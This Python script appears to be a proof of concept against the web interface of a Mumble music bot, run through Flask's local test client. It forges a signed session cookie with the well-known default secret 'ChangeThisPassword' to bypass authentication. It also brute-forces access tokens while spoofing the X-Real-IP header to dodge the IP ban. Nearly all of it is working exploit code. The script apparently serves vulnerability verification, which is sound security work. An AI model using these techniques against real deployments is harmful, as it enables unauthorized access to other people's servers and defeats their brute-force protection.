import configparser, os, sys, tempfile
sys.path.insert(0, os.getcwd())
import variables as var
from tests.test_web_api import FakeBot, FakeCache, FakePlaylist
base = tempfile.mkdtemp()
cfg = configparser.ConfigParser(interpolation=None)
cfg.read_dict({'webinterface': {'auth_method':'token','upload_enabled':'True','max_attempts':'10',
    'access_email_header':'','access_team_domain':'','access_aud':'','flask_secret':'ChangeThisPassword',
    'is_web_proxified':'True','user':'botamusique','password':'mumble','username':'b'},
    'bot':{'username':'b','delete_allowed':'False'},
    'commands':{'command_symbol':'!','requests_webinterface_access':'web'}})
var.config=cfg; var.music_folder=base+'/'; var.tmp_folder=base+'/tmp/'; var.language='en'
var.bot=FakeBot(); var.playlist=FakePlaylist(); var.cache=FakeCache(); var.user_db=None
class DB:
    store={}
    def get(self,s,k,fallback=None): return self.store.get((s,k),fallback)
    def set(self,s,k,v): self.store[(s,k)]=v
    def remove_option(self,s,k): self.store.pop((s,k),None)
var.db=DB()
import interface
interface.web.secret_key='ChangeThisPassword'
var.is_proxified=True; interface.init_proxy()

# A) No token, no session -> need_token page (denied)
c=interface.web.test_client()
print('A no-cred /api/status:', c.get('/api/status').status_code)

# B) Forge a Flask session cookie with the PUBLIC default secret
from flask.sessions import SecureCookieSessionInterface
class App: 
    secret_key='ChangeThisPassword'
    config={'SESSION_COOKIE_NAME':'session'}
si=SecureCookieSessionInterface()
s=si.get_signing_serializer(interface.web)
forged=s.dumps({'user':'attacker'})
c2=interface.web.test_client()
c2.set_cookie('session', forged, domain='localhost')
r=c2.get('/api/status')
print('B forged-cookie /api/status:', r.status_code)

# C) X-Real-IP ban evasion: 100 bad tokens, each a different spoofed IP
c3=interface.web.test_client()
for i in range(100):
    c3.get('/api/status?token=guess%d'%i, headers={'X-Real-IP':'9.9.9.%d'%(i%256)})
print('C banned_ip after 100 spoofed-IP bad tokens:', interface.banned_ip[:3], 'count=', len(interface.banned_ip))
